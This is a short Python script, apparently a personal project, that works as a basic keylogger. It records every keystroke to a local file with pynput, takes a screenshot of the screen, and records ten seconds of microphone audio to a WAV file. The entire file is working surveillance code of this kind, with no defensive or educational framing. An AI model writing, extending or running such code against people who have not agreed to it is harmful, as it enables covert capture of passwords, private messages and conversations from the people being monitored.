from pynput.keyboard import Key, Listener

from scipy.io.wavfile import write
import sounddevice as sd

from PIL import ImageGrab

keys_information = "key_log"
file_path = "C:\\Users\\bharg\\PycharmProjects\\pythonProject\\Project"
extend = "\\"
screenshot_path = "image.png"
microphone_time = 10
audio_info = "audio.wav"


def logging_keystroke(key):
    key=str(key).replace("'","")
    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == 'Key.enter':
        key = '\n'


    with open(keys_information, 'a') as b:
        b.write(key)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=logging_keystroke,on_release=on_release) as l:
    l.join()


#Taking screenshots


def screenshots():
    screenshot = ImageGrab.grab()
    screenshot.save(file_path + extend + screenshot_path)


screenshots()


def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs,channels=2)
    sd.wait()

    write(file_path + extend + audio_info,fs,myrecording)


microphone()





    










